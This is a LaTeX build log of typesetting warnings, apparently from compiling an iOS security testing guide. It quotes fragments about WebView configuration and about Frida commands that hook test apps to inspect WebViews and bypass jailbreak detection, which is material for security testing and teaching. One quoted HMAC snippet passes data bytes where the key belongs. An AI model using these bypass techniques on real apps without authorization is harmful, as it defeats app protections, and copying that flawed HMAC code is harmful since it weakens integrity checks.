AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 
[753]
Overfull \hbox (127.88235pt too wide) in paragraph at lines 43060--43065
\TU/SourceSansPro(0)/m/n/10.95 could be the case. We would be able to inspect t
he crash reports in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Library/
Logs/CrashReporter
[754]
Underfull \hbox (badness 6978) in paragraph at lines 43121--43125
[]\TU/SourceSansPro(0)/m/n/10.95 JavaScript is enabled by default but thanks to
 the \TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled \TU/SourceSansPro(0)/m/n/
10.95 property of

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa3dda3347111e374cb9b24068c0d2054439c109.
png" > [755] [756]
Overfull \hbox (29.84943pt too wide) in paragraph at lines 43238--43238
[]\TU/SourceCodePro(6)/m/n/10.95 625 0x00031670 0x100031670  17  18 (5.__TEXT._
_cstring) ascii unwindToWKWebView[] 
[757]
Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 43260--43260
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle __T0So9WKWebViewCABSC6C
GRectV5frame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (51.74957pt too wide) in paragraph at lines 43260--43260
[]                                \TU/SourceCodePro(6)/m/n/10.95 configuration:
 __C.WKWebViewConfiguration) -> __C.WKWebView[] 

Overfull \hbox (69.26941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT._
_objc_methname) ascii javaScriptEnabled[] 

Overfull \hbox (95.54941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT._
_objc_methname) ascii setJavaScriptEnabled:[] 
[758] [759] [760]
Underfull \hbox (badness 2469) in paragraph at lines 43463--43466
[]\TU/SourceSansPro(0)/m/n/10.95 For \TU/SourceCodePro(6)/m/n/10.95 WKWebView\T
U/SourceSansPro(0)/m/n/10.95 , you should verify if JavaScript is enabled. Use 
[][]\TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled[][] \TU/SourceSansPro(0)/m
/n/10.95 from
[761]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 

Overfull \hbox (93.3594pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 
[762]
Overfull \hbox (93.3594pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 
[763]
Overfull \hbox (200.66936pt too wide) in paragraph at lines 43632--43632
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/UIWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43632--43632
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (238.88126pt too wide) in paragraph at lines 43638--43647
[]\TU/SourceSansPro(0)/m/n/10.95 When working with \TU/SourceCodePro(6)/m/n/10.
95 WKWebView\TU/SourceSansPro(0)/m/n/10.95 s, Apple recommends using [][]\TU/So
urceCodePro(6)/m/n/10.95 loadHTMLString:baseURL:[][]\TU/SourceSansPro(0)/m/n/10
.95 /[][]\TU/SourceCodePro(6)/m/n/10.95 loadData:MIMEType:textEncodingName:base
URL:[][]

Underfull \hbox (badness 3343) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 to load local HTML files and \TU/SourceCodePro(6
)/m/n/10.95 loadRequest: \TU/SourceSansPro(0)/m/n/10.95 for web content. Typica
lly, the local files are

Underfull \hbox (badness 2573) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 loaded in combination with methods including, am
ong others: [][]\TU/SourceCodePro(6)/m/n/10.95 pathForResource:ofType:[][]\TU/S
ourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (49.55939pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration *configuration = [[
WKWebViewConfiguration alloc] init];[] 

Overfull \hbox (88.97943pt too wide) in paragraph at lines 43670--43670
[]        \TU/SourceCodePro(6)/m/n/10.95 CGRectGetHeight([UIScreen mainScreen].
bounds) - 84) configuration:configuration];[] 
[764]
Overfull \hbox (139.3494pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString *filePath = [[NSBundle mainBundle
] pathForResource:@"example_file" ofType:@"html"];[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 [self.webView loadHTMLString:html baseURL:
[NSBundle mainBundle].resourceURL];[] 

Overfull \hbox (200.66936pt too wide) in paragraph at lines 43682--43682
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/WKWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43682--43682
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (5.7594pt too wide) in paragraph at lines 43690--43690
[]\TU/SourceCodePro(6)/m/n/10.95 231 0x0002df6c 24 (4.__TEXT.__objc_methname) a
scii loadHTMLString:baseURL:[] 

Overfull \hbox (51.52684pt too wide) in paragraph at lines 43699--43708
[]\TU/SourceSansPro(0)/m/n/10.95 In addition, you should also verify if the app
 is using the method [][]\TU/SourceCodePro(6)/m/n/10.95 loadFileURL:allowingRea
dAccessToURL:[][]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (115.25938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 var scenario1Url = FileManager.default.urls(fo
r: .libraryDirectory, in: .userDomainMask)[0][] 

Overfull \hbox (38.60938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 scenario1Url = scenario1Url.appendingPathCompo
nent("WKWebView/scenario1.html")[] 

Overfull \hbox (30.29405pt too wide) in paragraph at lines 43719--43722
[]\TU/SourceSansPro(0)/m/n/10.95 In this case, the parameter \TU/SourceCodePro(
6)/m/n/10.95 allowingReadAccessToURL \TU/SourceSansPro(0)/m/n/10.95 contains a 
single file “WKWebView/scenario1.html”,
[765]
Overfull \hbox (91.16939pt too wide) in paragraph at lines 43728--43728
[]\TU/SourceCodePro(6)/m/n/10.95 237 0x0002dff1 37 (4.__TEXT.__objc_methname) a
scii loadFileURL:allowingReadAccessToURL:[] 

Underfull \hbox (badness 10000) in paragraph at lines 43764--43769
[]\TU/SourceCodePro(6)/m/n/10.95 allowFileAccessFromFileURLs \TU/SourceSansPro(
0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKPreferences\TU/SourceSansPro(0)/
m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPro(0)/m/n/10.95
 by default): it enables

Underfull \hbox (badness 1127) in paragraph at lines 43764--43769
\TU/SourceSansPro(0)/m/n/10.95 JavaScript running in the context of a \TU/Sourc
eCodePro(6)/m/n/10.95 file:// \TU/SourceSansPro(0)/m/n/10.95 scheme URL to acce
ss content from other

Underfull \hbox (badness 3492) in paragraph at lines 43769--43773
[]\TU/SourceCodePro(6)/m/n/10.95 allowUniversalAccessFromFileURLs \TU/SourceSan
sPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration\TU/Sou
rceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPr
o(0)/m/n/10.95 by de-

Overfull \hbox (104.30936pt too wide) in paragraph at lines 43783--43783
[]\TU/SourceCodePro(6)/m/n/10.95 [webView.configuration.preferences setValue:@Y
ES forKey:@"allowFileAccessFromFileURLs"];[] 

Overfull \hbox (97.73936pt too wide) in paragraph at lines 43789--43789
[]\TU/SourceCodePro(6)/m/n/10.95 webView.configuration.preferences.setValue(tru
e, forKey: "allowFileAccessFromFileURLs")[] 
[766]
Underfull \hbox (badness 1418) in paragraph at lines 43799--43811
\TU/SourceSansPro(0)/m/n/10.95 can be found in the [][]Apple developer documena
tion[][]. Phone links should be then used (e.g. \TU/SourceCodePro(6)/m/n/10.95 
<a

Underfull \hbox (badness 3312) in paragraph at lines 43848--43853
[]\TU/SourceSansPro(0)/m/n/10.95 As we have seen above in “Testing How WebViews
 are Loaded”, if “scenario 2” of the WKWe-

Underfull \hbox (badness 5161) in paragraph at lines 43848--43853
\TU/SourceSansPro(0)/m/n/10.95 bViews is loaded, the app will do so by calling 
[][]\TU/SourceCodePro(6)/m/n/10.95 URLForResource:withExtension:[][] \TU/Source
SansPro(0)/m/n/10.95 and

Underfull \hbox (badness 3291) in paragraph at lines 43854--43856
[]\TU/SourceSansPro(0)/m/n/10.95 To quicky inspect this, you can use frida-trac
e and trace all “loadHTMLString” and “URLForRe-

Overfull \hbox (23.27945pt too wide) in paragraph at lines 43871--43871
[]    \TU/SourceCodePro(6)/m/n/10.95 -m "*[WKWebView *loadHTMLString*]" -m "*[*
 URLForResource:withExtension:]"[] 
[767] [768]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 43923--43923
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]preferences[]().[]valu
eForKey_[]([][]allowFileAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (105.5245pt too wide) in paragraph at lines 43926--43926
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]valueForKey_[]([][]all
owUniversalAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (42.98943pt too wide) in paragraph at lines 43962--43962
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U -f com.authenticationfailure.Wheres
MyBrowser -l webviews_inspector.js[] 
[769]
Overfull \hbox (34.22939pt too wide) in paragraph at lines 44020--44020
[]\TU/SourceCodePro(6)/m/n/10.95 [webView valueForKeyPath:@"documentView.webVie
w.mainFrame.javaScriptContext"][] 
[770]
Overfull \hbox (14.5194pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 let userContentController = wkWebViewConfi
guration.userContentController[] 

Overfull \hbox (51.7494pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 userContentController.removeScriptMessageH
andler(forName: "javaScriptBridge")[] 

Overfull \hbox (29.84946pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 let javaScriptBridgeMessageHandler
 = JavaScriptBridgeMessageHandler()[] 

Overfull \hbox (124.01942pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 userContentController.add(javaScri
ptBridgeMessageHandler, name: "javaScriptBridge")[] 

Overfull \hbox (115.6463pt too wide) in paragraph at lines 44058--44066
\TU/SourceSansPro(0)/m/n/10.95 causes the JavaScript function \TU/SourceCodePro
(6)/m/n/10.95 window.webkit.messageHandlers.myJavaScriptMessageHandler.postMess
age

Overfull \hbox (27.5245pt too wide) in paragraph at lines 44072--44072
\TU/SourceCodePro(6)/m/n/10 dow[].[]webkit[].[]messageHandlers[].[]javaScriptBr
idge[].[]postMessage[]([[]"multiplyNumbers"[][],[] 
[771]
Overfull \hbox (75.83936pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 let javaScriptCallBack = "javascriptBridgeCall
Back([]\(functionFromJS)[],[]\(result)[])"[] 

Overfull \hbox (45.1794pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 message.webView?.evaluateJavaScript(javaScript
CallBack, completionHandler: nil)[] 

Underfull \hbox (badness 2538) in paragraph at lines 44135--44143
\TU/SourceSansPro(0)/m/n/10.95 iOS WebViews ([][]\TU/SourceCodePro(6)/m/n/10.95
 stringByEvaluatingJavaScriptFromString:[][] \TU/SourceSansPro(0)/m/n/10.95 for
 \TU/SourceCodePro(6)/m/n/10.95 UIWebView \TU/SourceSansPro(0)/m/n/10.95 and
[772]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/843077a52818429fe7eadddb9f213dda9441d42b.
png" > [773]
Underfull \hbox (badness 1688) in paragraph at lines 44182--44193
[]\TU/SourceSansPro(0)/m/n/10.95 iOS comes with two protocols for object encodi
ng and decoding for Objective-C or \TU/SourceCodePro(6)/m/n/10.95 NSObject\TU/S
ourceSansPro(0)/m/n/10.95 s:
[774]
Overfull \hbox (12.32938pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 NSKeyedArchiver.archiveRootObject(customPoint,
 toFile: "/path/to/archive")[] 

Overfull \hbox (104.30934pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 guard let customPoint = NSKeyedUnarchiver.unar
chiveObjectWithFile("/path/to/archive") as?[] 
[775] [776]
Overfull \hbox (0.46265pt too wide) in paragraph at lines 44355--44358
[]\TU/SourceSansPro(0)/m/n/10.95 Next, Apple provides support for JSON encoding
/decoding directly by combining \TU/SourceCodePro(6)/m/n/10.95 Codable \TU/Sour
ceSansPro(0)/m/n/10.95 together with

Overfull \hbox (25.46938pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 NSUserDefaults.standardUserDefaults().setObjec
t(data, forKey: "customPoint")[] 
[777]
Overfull \hbox (119.63936pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 if let data = NSUserDefaults.standardUserDefau
lts().objectForKey("customPoint") as? NSData {[] 

Overfull \hbox (106.4994pt too wide) in paragraph at lines 44423--44423
[]    \TU/SourceCodePro(6)/m/n/10.95 UserDefaults.standard.set(try? PropertyLis
tEncoder().encode(points), forKey: "points")[] 

Overfull \hbox (110.87943pt too wide) in paragraph at lines 44423--44423
[]        \TU/SourceCodePro(6)/m/n/10.95 let points2 = try? PropertyListDecoder
().decode([CustomPointStruct].self, from: data)[] 
[778]
Overfull \hbox (55.11115pt too wide) in paragraph at lines 44460--44463
[]\TU/SourceSansPro(0)/m/n/10.95 When not using third party libraries, but Appl
e’s \TU/SourceCodePro(6)/m/n/10.95 XMLParser\TU/SourceSansPro(0)/m/n/10.95 , be
 sure to let \TU/SourceCodePro(6)/m/n/10.95 shouldResolveExternalEntities
[779] [780]
Underfull \hbox (badness 10000) in paragraph at lines 44631--44634
[][][][][][] [] [][] [] [][][][] [] [][][][] [] [][][][][][][][] [] [][][][][] 
[] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][] [] []
[][][][][][] [] [][] [] [][][] [] [][][][] []
[781]
Underfull \hbox (badness 10000) in paragraph at lines 44705--44707
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44713--44715
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44715--44717
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][] []

Overfull \hbox (14.78555pt too wide) in paragraph at lines 44719--44721
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][] [][] [][][] [][] [][]
[][][] [][] [][][][][][][][][][][] [] [][][][][][][][][] [][] [][] [][] [][][][
][][][] [][] [][][][] [][] [][][][][][][][] [][] [][][][][][][][][][][][]$[][] 

[782]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 44777--44777
[]\TU/SourceCodePro(6)/m/n/10.95 CodeDirectory v=20200 size=154808 flags=0x0(no
ne) hashes=4830+5 location=embedded[] 
[783]
Underfull \hbox (badness 3375) in paragraph at lines 44815--44818
[]\TU/SourceSansPro(0)/m/n/10.95 Under ‘Apple LVM - Preprocessing’ and ‘Preproc
essor Macros’, make sure ‘DEBUG’ or ‘DE-
[784] [785]
Underfull \hbox (badness 4205) in paragraph at lines 44923--44926
[]\TU/SourceSansPro(0)/m/n/10.95 Search the code for the following printing fun
ctions: \TU/SourceCodePro(6)/m/n/10.95 NSLog\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceCodePro(6)/m/n/10.95 println\TU/SourceSansPro(0)/m/n/10.95 , \TU/Source
CodePro(6)/m/n/10.95 print\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)
/m/n/10.95 dump\TU/SourceSansPro(0)/m/n/10.95 ,
[786] [787]
Underfull \hbox (badness 2368) in paragraph at lines 45048--45052
[]\TU/SourceSansPro(0)/m/n/10.95 There are three widely used package management
 tools [][]Swift Package Manager[][], [][]Carthage[][], and
[788] [789] [790] [791] [792] [793]
Underfull \hbox (badness 1558) in paragraph at lines 45455--45474
[]\TU/SourceSansPro(0)/m/n/10.95 Exception handing in Swift (2 - 5) is quite di
fferent. The try-catch block is not there to handle
[794] [795] [796]
Overfull \hbox (222.56935pt too wide) in paragraph at lines 45632--45632
[]    \TU/SourceCodePro(6)/m/n/10.95 guard let url = URL(string: "https://raw.g
ithubusercontent.com/OWASP/owasp-mstg/master/book.json") else {[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 45632--45632
[]\TU/SourceCodePro(6)/m/n/10.95 func request(url: URL, completion: @escaping (
Result<MSTG, RequestError>) -> Void) {[] 
[797]
Overfull \hbox (40.7995pt too wide) in paragraph at lines 45632--45632
[]                \TU/SourceCodePro(6)/m/n/10.95 guard let response = try? deco
der.decode(MSTG.self, from: data) else {[] 
[798]
Overfull \hbox (25.98166pt too wide) in paragraph at lines 45717--45722
\TU/SourceSansPro(0)/m/n/10.95 that shouldn’t be easily retrievable. The handle
r can be set via \TU/SourceCodePro(6)/m/n/10.95 NSSetUncaughtExceptionHandler\T
U/SourceSansPro(0)/m/n/10.95 . 
[799]
Overfull \hbox (111.40877pt too wide) in paragraph at lines 45828--45832
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you can check whether memory is freed to
o fast or too slow by enabling \TU/SourceCodePro(6)/m/n/10.95 NSAutoreleaseFree
dObjectCheckEnabled\TU/SourceSansPro(0)/m/n/10.95 ,
[800] [801] [802]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88d9e255a1243b1933f293f801ad60b967a4ed03.
png" > [803]
Underfull \hbox (badness 10000) in paragraph at lines 46032--46034
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][] [] [][][][][][][] [] [][][][][][][][][][][][][] [] [][][][][] [] [][][
][][][][][][][] [] [][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 46034--46035
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][] [][] [][][]
[][][][][][][][] [] [][][] [][] [][][][][][][][][][][] [][] [][][][][][] [][] [
][][][][] [][] [][][][][] [][] [][][] [][] [][][][][] [][]
[804]
Underfull \hbox (badness 10000) in paragraph at lines 46093--46095
[]\TU/SourceSansPro(0)/m/n/10.95 Codesign - [][]$[][][][][] [] [] [] [][][][][]
[][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [][][][
][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][] []
[805]
Overfull \hbox (102.1194pt too wide) in paragraph at lines 46186--46186
[]   \TU/SourceCodePro(6)/m/n/10.95 [[NSFileManager defaultManager] removeItemA
tPath:@"/private/jailbreak.txt" error:nil];[] 
[806]
Overfull \hbox (259.79935pt too wide) in paragraph at lines 46198--46198
[]\TU/SourceCodePro(6)/m/n/10.95 if([[UIApplication sharedApplication] canOpenU
RL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf614ae451bbad93635811b9e53554f0f55bbc3c.
png" > [807]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9246692bf50d7cf2d6312b100d30e7c6deea379.
png" > [808]
Underfull \hbox (badness 1024) in paragraph at lines 46271--46276
[]\TU/SourceSansPro(0)/m/n/10.95 As you can see, our class method was called di
rectly, and it returned “true”. Now, let’s call the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa88d9be69692cc72825cb21b5db66c3a3b04933.
png" > [809]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3c0b37c8ec6ce33695b9fb2794d8af5880f033d.
png" >
Overfull \hbox (314.54935pt too wide) in paragraph at lines 46354--46354
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]"[] 

[810]
Overfull \hbox (321.11934pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]:"[]
 

Overfull \hbox (255.41933pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 -[JailbreakDetectionVC isJailbroken]: Loaded h
andler at "./__handlers__/__JailbreakDetectionVC_isJailbroken_.js"[] 
[811] [812] [813] [814]
Overfull \hbox (36.41942pt too wide) in paragraph at lines 46571--46571
[]\TU/SourceCodePro(6)/m/n/10.95 typedef int (*ptrace_ptr_t)(int _request, pid_
t _pid, caddr_t _addr, int _data);[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7e0b90280358800d0d8dd506c16a9aa7131f24db.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ce91965ea5c01a401c81870af5e87e03516b28d1.
png" > [815] [816]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/14eb01600e94692001b0400a81a0fe1cf64da602.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc3959523dec4d1ba423fc34e7a72ba96a9fa1fb.
png" > [817] [818] [819] [820]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 46845--46845
[]    \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableDa
ta dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (491.93927pt too wide) in paragraph at lines 46845--46845
[]    \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes
], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [di
gestBuffer mutableBytes]);[] 

Overfull \hbox (279.50934pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* hmac = [data subdataWithRange:NSMake
Range(data.length - CC_SHA256_DIGEST_LENGTH, CC_SHA256_DIGEST_LENGTH)];[] 

Overfull \hbox (108.68939pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData* actualData = [data subdataWithRange:
NSMakeRange(0, (data.length - hmac.length))];[] 

Overfull \hbox (88.9794pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableData
 dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (483.17926pt too wide) in paragraph at lines 46870--46870
[]  \TU/SourceCodePro(6)/m/n/10.95 CCHmac(kCCHmacAlgSHA256, [actualData bytes],
 (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [dige
stBuffer mutableBytes]);[] 
[821] [822]
Overfull \hbox (255.86594pt too wide) in paragraph at lines 46996--47002
\TU/SourceSansPro(0)/m/n/10.95 side the \TU/SourceCodePro(6)/m/n/10.95 <Applica
tion>.app \TU/SourceSansPro(0)/m/n/10.95 directory. If you inspect the content 
of the \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/<UUID>
/<Application>.app
[823] [824] [825] [826] [827]
Overfull \hbox (16.70938pt too wide) in paragraph at lines 47265--47265
[]\TU/SourceCodePro(6)/m/n/10.95 __T07DVIA_v232JailbreakDetectionViewController
C20jailbreakTest4TappedyypF:[] 
[828]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3f030b8c86c7c6cc516e082a4161b4b92914121b.
png" > [829] [830]
Overfull \hbox (27.5245pt too wide) in paragraph at lines 47404--47404
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
20amIReverseEngineeredSbyFZ)|  

Overfull \hbox (177.5245pt too wide) in paragraph at lines 47405--47405
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

Overfull \hbox (315.5245pt too wide) in paragraph at lines 47406--47406
\TU/SourceCodePro(6)/m/n/10 (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC
31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)|  

[831]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0578a17ea75d138074bdaae5284ec9b7ebabe3ea.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4353ea9e0ca8fb1454b4d8eb9dfa0b42c7673cf9.
png" >
Overfull \hbox (19.88026pt too wide) in paragraph at lines 47428--47430
 [][] 
[832] [833]
Overfull \hbox (15.88817pt too wide) in paragraph at lines 47525--47530
[]\TU/SourceSansPro(0)/m/n/10.95 using the UDID: \TU/SourceCodePro(6)/m/n/10.95
 [[[UIDevice currentDevice] identifierForVendor] UUIDString];

Overfull \hbox (38.16412pt too wide) in paragraph at lines 47530--47534
